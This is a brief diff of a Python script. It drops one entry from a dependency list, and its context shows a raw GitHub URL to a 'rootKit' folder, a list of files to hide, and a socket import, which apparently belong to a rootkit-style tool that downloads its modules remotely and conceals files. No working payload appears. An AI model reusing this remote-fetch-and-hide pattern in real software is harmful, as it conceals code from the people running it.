@@ -1,4 +1,4 @@
-listFileDepency = ['fct.py', 'scripter.py', 'sound.py']
+listFileDepency = ['scripter.py', 'sound.py']
 hideFile = ["__pycache__"]
 githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"
 import socket
@@ -32,6 +32,7 @@ except:
         exit()
     else:
         exit()
+
 
 f = File(os.getcwd().replace('\\', '/')+"/")
 for file in hideFile:
